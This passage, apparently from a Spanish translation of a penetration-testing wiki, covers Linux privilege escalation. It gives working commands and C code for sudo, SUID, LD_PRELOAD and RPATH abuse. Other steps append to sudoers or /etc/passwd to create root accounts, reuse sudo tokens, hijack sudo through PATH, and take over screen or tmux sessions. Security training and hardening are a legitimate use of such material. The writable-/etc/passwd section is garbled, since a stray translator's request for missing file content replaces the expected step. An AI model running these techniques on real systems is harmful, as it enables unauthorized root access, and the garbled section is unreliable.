Se proporciona un ejemplo de tal política en `/etc/dbus-1/system.d/wpa_supplicant.conf`, detallando permisos para el usuario root para poseer, enviar y recibir mensajes de `fi.w1.wpa_supplicant1`.

Las políticas sin un usuario o grupo especificado se aplican de forma universal, mientras que las políticas en el contexto "default" se aplican a todos los no cubiertos por otras políticas específicas.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Aprende cómo enumerar y explotar una comunicación D-Bus aquí:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Red**

Siempre es interesante enumerar la red y determinar la posición de la máquina.

### Enumeración genérica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Puertos abiertos

Siempre comprueba los servicios de red que se estén ejecutando en la máquina con los que no pudiste interactuar antes de acceder a ella:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Comprueba si puedes sniff traffic. Si puedes, podrías obtener algunas credentials.
```
timeout 1 tcpdump
```
## Usuarios

### Enumeración genérica

Comprueba **quién** eres, qué **privilegios** tienes, qué **usuarios** hay en los sistemas, cuáles pueden **login** y cuáles tienen **privilegios root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID grande

Algunas versiones de Linux se vieron afectadas por una vulnerabilidad que permite a usuarios con **UID > INT_MAX** escalar privilegios. Más info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Explotarlo** usando: **`systemd-run -t /bin/bash`**

### Grupos

Comprueba si eres **miembro de algún grupo** que podría concederte privilegios de root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Portapapeles

Comprueba si hay algo interesante en el portapapeles (si es posible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de contraseñas
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Contraseñas conocidas

Si **conoces alguna contraseña** del entorno **intenta iniciar sesión como cada usuario** usando la contraseña.

### Su Brute

If don't mind about doing a lot of noise and `su` and `timeout` binaries are present on the computer, you can try to brute-force user using [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) with `-a` parameter also try to brute-force users.

## Abusos de PATH escribible

### $PATH

Si descubres que puedes **escribir en alguna carpeta del $PATH** podrías ser capaz de escalar privilegios creando una **backdoor dentro de la carpeta escribible** con el nombre de algún comando que vaya a ser ejecutado por un usuario distinto (idealmente root) y que **no se cargue desde una carpeta ubicada antes** de tu carpeta escribible en el $PATH.

### SUDO and SUID

You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Algunos **unexpected commands allow you to read and/or write files or even execute a command.** Por ejemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuración de Sudo podría permitir a un usuario ejecutar algún comando con los privilegios de otro usuario sin conocer la contraseña.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
En este ejemplo el usuario `demo` puede ejecutar `vim` como `root`; ahora es trivial obtener un shell añadiendo una ssh key en el directorio root o ejecutando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta directiva permite al usuario **establecer una variable de entorno** mientras ejecuta algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este ejemplo, **basado en la máquina HTB Admirer**, fue **vulnerable** a **PYTHONPATH hijacking** para cargar una biblioteca de python arbitraria mientras se ejecutaba el script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

Si sudoers conserva `BASH_ENV` (por ejemplo, `Defaults env_keep+="ENV BASH_ENV"`), puedes aprovechar el comportamiento de arranque no interactivo de Bash para ejecutar código arbitrario como root al invocar un comando permitido.

- Por qué funciona: Para shells no interactivos, Bash evalúa `$BASH_ENV` y carga (source) ese archivo antes de ejecutar el script objetivo. Muchas reglas de sudo permiten ejecutar un script o un wrapper de shell. Si `BASH_ENV` es preservado por sudo, tu archivo se carga con privilegios de root.

- Requisitos:
- Una regla de sudo que puedas ejecutar (cualquier objetivo que invoque `/bin/bash` de forma no interactiva, o cualquier bash script).
- `BASH_ENV` presente en `env_keep` (verifícalo con `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Eliminar `BASH_ENV` (y `ENV`) de `env_keep`; usar `env_reset`.
- Evitar wrappers de shell para comandos permitidos por sudo; usar binarios mínimos.
- Considerar sudo I/O logging y alertas cuando se usan env vars preservadas.

### Sudo execution bypassing paths

**Saltar** para leer otros archivos o usar **symlinks**. Por ejemplo en sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si se usa un **wildcard** (\*), es aún más fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary sin especificar la ruta del comando

Si se otorga el **permiso sudo** a un único comando **sin especificar la ruta**: _hacker10 ALL= (root) less_ puedes explotarlo cambiando la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica también puede usarse si un binario **suid** **ejecuta otro comando sin especificar la ruta (siempre verifica con** _**strings**_ **el contenido de un binario SUID extraño)**.

[Payload examples to execute.](payloads-to-execute.md)

### Binario SUID con ruta del comando

Si el binario **suid** **ejecuta otro comando especificando la ruta**, entonces, puedes intentar **exportar una función** con el nombre del comando que el archivo suid está llamando.

Por ejemplo, si un binario suid llama a _**/usr/sbin/service apache2 start**_ tienes que intentar crear la función y exportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Entonces, cuando ejecutes el suid binary, esta función se ejecutará

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable de entorno **LD_PRELOAD** se usa para especificar una o más bibliotecas compartidas (archivos .so) que el cargador cargará antes que todas las demás, incluyendo la biblioteca estándar de C (`libc.so`). Este proceso se conoce como precarga de una biblioteca.

Sin embargo, para mantener la seguridad del sistema y evitar que esta característica sea explotada, particularmente con ejecutables **suid/sgid**, el sistema aplica ciertas condiciones:

- El cargador ignora **LD_PRELOAD** para ejecutables donde el ID de usuario real (_ruid_) no coincide con el ID de usuario efectivo (_euid_).
- Para ejecutables con **suid/sgid**, solo se precargan bibliotecas en rutas estándar que también sean **suid/sgid**.

La escalada de privilegios puede ocurrir si tienes la capacidad de ejecutar comandos con `sudo` y la salida de `sudo -l` incluye la sentencia **env_keep+=LD_PRELOAD**. Esta configuración permite que la variable de entorno **LD_PRELOAD** persista y sea reconocida incluso cuando los comandos se ejecutan con `sudo`, lo que potencialmente puede conducir a la ejecución de código arbitrario con privilegios elevados.
```
Defaults        env_keep += LD_PRELOAD
```
Guardar como **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
A continuación, **compílalo** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **escalate privileges** ejecutando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc similar puede ser abusado si el atacante controla la variable de entorno **LD_LIBRARY_PATH** porque controla la ruta donde se van a buscar las bibliotecas.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Al encontrarse con un binario con permisos **SUID** que parezca inusual, es buena práctica verificar si está cargando correctamente archivos **.so**. Esto se puede comprobar ejecutando el siguiente comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por ejemplo, encontrar un error como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugiere la posibilidad de explotación.

Para explotarlo, se procedería a crear un archivo C, por ejemplo _"/path/to/.config/libcalc.c"_, que contenga el siguiente código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Este código, una vez compilado y ejecutado, tiene como objetivo elevar privilegios manipulando permisos de archivos y ejecutando una shell con privilegios elevados.

Compila el archivo C anterior en un objeto compartido (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Finalmente, ejecutar el binario SUID afectado debería desencadenar el exploit, permitiendo un posible compromiso del sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ahora que hemos encontrado un SUID binary que carga una library desde una folder donde podemos escribir, vamos a crear la library en esa folder con el nombre necesario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si obtienes un error como
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
eso significa que la biblioteca que hayas generado debe tener una función llamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) es una lista curada de binarios Unix que pueden ser explotados por un atacante para eludir restricciones de seguridad locales. [**GTFOArgs**](https://gtfoargs.github.io/) es lo mismo pero para casos donde sólo puedes **inject arguments** en un comando.

El proyecto recopila funciones legítimas de binarios Unix que pueden ser abusadas para escapar de restricted shells, escalar o mantener privilegios elevados, transferir archivos, spawn bind and reverse shells, y facilitar otras post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si puedes ejecutar `sudo -l` puedes usar la herramienta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para comprobar si encuentra cómo explotar alguna regla de sudo.

### Reusing Sudo Tokens

En casos donde tienes **sudo access** pero no la contraseña, puedes escalar privilegios esperando la ejecución de un comando sudo y luego secuestrando el token de sesión.

Requisitos para escalar privilegios:

- Ya tienes una shell como el usuario "_sampleuser_"
- "_sampleuser_" ha **used `sudo`** para ejecutar algo en los **últimos 15mins** (por defecto esa es la duración del token de sudo que nos permite usar `sudo` sin introducir ninguna contraseña)
- `cat /proc/sys/kernel/yama/ptrace_scope` es 0
- `gdb` está accesible (puedes subirlo)

(Puedes habilitar temporalmente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o modificando permanentemente `/etc/sysctl.d/10-ptrace.conf` y estableciendo `kernel.yama.ptrace_scope = 0`)

Si se cumplen todos estos requisitos, **puedes escalar privilegios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- El **primer exploit** (`exploit.sh`) creará el binario `activate_sudo_token` en _/tmp_. Puedes usarlo para **activar el token de sudo en tu sesión** (no obtendrás automáticamente una shell root, haz `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- El **segundo exploit** (`exploit_v2.sh`) creará un shell sh en _/tmp_ **propiedad de root con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- El **tercer exploit** (`exploit_v3.sh`) **creará un archivo sudoers** que hará que **los sudo tokens sean eternos y que todos los usuarios puedan usar sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Si tienes permisos de escritura en la carpeta o sobre cualquiera de los archivos creados dentro de ella, puedes usar el binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **create a sudo token for a user and PID**.\
Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y tienes un shell como ese usuario con PID 1234, puedes **obtain sudo privileges** sin necesidad de conocer la contraseña ejecutando:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

El archivo `/etc/sudoers` y los archivos dentro de `/etc/sudoers.d` configuran quién puede usar `sudo` y cómo. Estos archivos **por defecto solo pueden ser leídos por el usuario root y el grupo root**.\
**Si** puedes **leer** este archivo podrías ser capaz de **obtener información interesante**, y si puedes **escribir** cualquier archivo podrás **escalar privilegios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si puedes escribir, puedes abusar de este permiso.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Otra forma de abusar de estos permisos:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Hay algunas alternativas al binario `sudo` como `doas` para OpenBSD; recuerda revisar su configuración en `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Si sabes que un **usuario suele conectarse a una máquina y usa `sudo`** para escalar privilegios y obtuviste un shell dentro de ese contexto de usuario, puedes **crear un nuevo ejecutable sudo** que ejecutará tu código como root y luego el comando del usuario. Luego, **modifica el $PATH** del contexto del usuario (por ejemplo añadiendo la nueva ruta en .bash_profile) para que cuando el usuario ejecute sudo, se ejecute tu ejecutable sudo.

Ten en cuenta que si el usuario usa un shell diferente (no bash) necesitarás modificar otros archivos para agregar la nueva ruta. Por ejemplo[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puedes encontrar otro ejemplo en [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

O ejecutando algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteca compartida

### ld.so

El archivo `/etc/ld.so.conf` indica **de dónde provienen los archivos de configuración cargados**. Típicamente, este archivo contiene la siguiente ruta: `include /etc/ld.so.conf.d/*.conf`

Eso significa que los archivos de configuración en `/etc/ld.so.conf.d/*.conf` serán leídos. Estos archivos de configuración **apuntan a otras carpetas** donde se **buscarán** **librerías**. Por ejemplo, el contenido de `/etc/ld.so.conf.d/libc.conf` es `/usr/local/lib`. **Esto significa que el sistema buscará librerías dentro de `/usr/local/lib`**.

Si por alguna razón **un usuario tiene permisos de escritura** en cualquiera de las rutas indicadas: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cualquier archivo dentro de `/etc/ld.so.conf.d/` o cualquier carpeta referenciada por los archivos de configuración en `/etc/ld.so.conf.d/*.conf` puede ser capaz de escalar privilegios.\
Echa un vistazo a **cómo explotar esta mala configuración** en la siguiente página:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Al copiar la lib en `/var/tmp/flag15/` será usada por el programa en ese lugar según lo especificado en la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Luego crea una biblioteca maliciosa en `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacidades

Linux capabilities proporcionan un **subconjunto de los privilegios de root disponibles para un proceso**. Esto efectivamente divide los **privilegios de root en unidades más pequeñas y distintivas**. Cada una de estas unidades puede entonces ser otorgada de forma independiente a los procesos. De este modo se reduce el conjunto completo de privilegios, disminuyendo los riesgos de explotación.\
Consulta la siguiente página para **aprender más sobre capacidades y cómo abusar de ellas**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Permisos de directorio

En un directorio, el **bit de "execute"** implica que el usuario afectado puede "**cd**" al directorio.\
El **bit "read"** implica que el usuario puede **listar** los **archivos**, y el **bit "write"** implica que el usuario puede **eliminar** y **crear** nuevos **archivos**.

## ACLs

Las Listas de Control de Acceso (ACLs) representan la capa secundaria de permisos discrecionales, capaces de **sobrescribir los permisos tradicionales ugo/rwx**. Estos permisos mejoran el control sobre el acceso a archivos o directorios al permitir o denegar derechos a usuarios específicos que no son los propietarios ni forman parte del grupo. Este nivel de **granularidad garantiza una gestión de acceso más precisa**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dar** al usuario "kali" permisos de lectura y escritura sobre un archivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtener** archivos con ACLs específicas del sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Abrir shell sessions

En **versiones antiguas** puedes **hijack** alguna sesión **shell** de un usuario diferente (**root**).\
En **versiones más recientes** solo podrás **connect** a screen sessions de **tu propio usuario**. Sin embargo, podrías encontrar **información interesante dentro de la sesión**.

### screen sessions hijacking

**Listar screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Adjuntar a una sesión**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Esto fue un problema con **versiones antiguas de tmux**. No pude hijackear una sesión de tmux (v2.1) creada por root como usuario no privilegiado.

**Listar sesiones de tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Adjuntar a una sesión**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Consulta **Valentine box from HTB** como ejemplo.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Todas las claves SSL y SSH generadas en sistemas basados en Debian (Ubuntu, Kubuntu, etc) entre septiembre de 2006 y el 13 de mayo de 2008 pueden verse afectadas por este bug.\
Este bug se produce al crear una nueva ssh key en esos OS, ya que **solo eran posibles 32,768 variaciones**. Esto significa que todas las posibilidades pueden calcularse y **teniendo la ssh public key puedes buscar la private key correspondiente**. Puedes encontrar las posibilidades calculadas aquí: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Valores de configuración interesantes

- **PasswordAuthentication:** Especifica si se permite la autenticación por contraseña. El valor por defecto es `no`.
- **PubkeyAuthentication:** Especifica si se permite la autenticación mediante public key. El valor por defecto es `yes`.
- **PermitEmptyPasswords**: Cuando la autenticación por contraseña está permitida, especifica si el servidor permite iniciar sesión en cuentas con contraseñas vacías. El valor por defecto es `no`.

### PermitRootLogin

Especifica si root puede iniciar sesión usando ssh, por defecto es `no`. Valores posibles:

- `yes`: root puede iniciar sesión usando password y private key
- `without-password` or `prohibit-password`: root solo puede iniciar sesión con una private key
- `forced-commands-only`: root solo puede iniciar sesión usando private key y si las opciones de comandos están especificadas
- `no` : no

### AuthorizedKeysFile

Especifica los archivos que contienen las public keys que pueden usarse para la autenticación de usuarios. Puede contener tokens como `%h`, que serán reemplazados por el directorio home. **Puedes indicar rutas absolutas** (empezando en `/`) o **rutas relativas desde el home del usuario**. Por ejemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Esa configuración indicará que si intentas iniciar sesión con la **private** key del usuario "**testusername**" ssh va a comparar la public key de tu key con las que están en `/home/testusername/.ssh/authorized_keys` y `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding te permite **use your local SSH keys instead of leaving keys** (without passphrases!) guardadas en tu servidor. Así, podrás **jump** vía ssh **to a host** y desde allí **jump to another** host **using** la **key** ubicada en tu **initial host**.

Necesitas configurar esta opción en `$HOME/.ssh.config` así:
```
Host example.com
ForwardAgent yes
```
Nota que si `Host` es `*` cada vez que el usuario se conecta a una máquina diferente, esa máquina podrá acceder a las keys (lo cual es un problema de seguridad).

El archivo `/etc/ssh_config` puede **sobrescribir** estas **opciones** y permitir o denegar esta configuración.\
El archivo `/etc/sshd_config` puede **permitir** o **denegar** el forwarding de ssh-agent con la palabra clave `AllowAgentForwarding` (por defecto está permitido).

Si encuentras que Forward Agent está configurado en un entorno, lee la siguiente página ya que **podrías ser capaz de abusar de ello para escalar privilegios**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Archivos interesantes

### Archivos de perfil

El archivo `/etc/profile` y los archivos bajo `/etc/profile.d/` son **scripts que se ejecutan cuando un usuario inicia una nueva shell**. Por lo tanto, si puedes **escribir o modificar cualquiera de ellos, puedes escalar privilegios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si se encuentra algún script de perfil extraño deberías revisarlo en busca de **detalles sensibles**.

### Archivos Passwd/Shadow

Dependiendo del OS los archivos `/etc/passwd` y `/etc/shadow` pueden estar usando un nombre diferente o puede existir una copia de seguridad. Por lo tanto se recomienda **encontrarlos todos** y **comprobar si puedes leerlos** para ver **si hay hashes** dentro de los archivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
En algunas ocasiones puedes encontrar **password hashes** dentro del archivo `/etc/passwd` (o equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd escribible

Primero, genera una contraseña con uno de los siguientes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
No tengo el contenido de src/linux-hardening/privilege-escalation/README.md. Pásame el contenido del archivo que quieres traducir (o confirma que puedo leerlo si ya lo subiste aquí).

También aclara cómo quieres que añada el usuario:
- ¿Quieres la contraseña en texto plano o en formato hashed (por ejemplo bcrypt/sha512)?
- Longitud y complejidad deseada (ej.: 16 caracteres, incluir símbolos, mayúsculas, números).
Si no especificas, generaré una contraseña fuerte de 16 caracteres y la incluiré en texto plano bajo una sección nueva que añadiré al final del README traducido.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Ej.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ahora puedes usar el comando `su` con `hacker:hacker`

Alternativamente, puedes usar las siguientes líneas para añadir un usuario dummy sin contraseña.\
ADVERTENCIA: podrías degradar la seguridad actual de la máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: En plataformas BSD `/etc/passwd` se encuentra en `/etc/pwd.db` y `/etc/master.passwd`, además `/etc/shadow` se renombra a `/etc/spwd.db`.

Debe comprobar si puede **escribir en algunos archivos sensibles**. Por ejemplo, ¿puede escribir en algún **archivo de configuración de servicio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por ejemplo, si la máquina está ejecutando un servidor **tomcat** y puedes **modificar el archivo de configuración del servicio Tomcat dentro de /etc/systemd/,** entonces puedes modificar las líneas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Tu backdoor se ejecutará la próxima vez que se inicie tomcat.

### Comprobar carpetas

Las siguientes carpetas pueden contener copias de seguridad o información interesante: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablemente no podrás leer la última pero inténtalo)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ubicación extraña/archivos Owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Archivos modificados en los últimos minutos
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB files
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
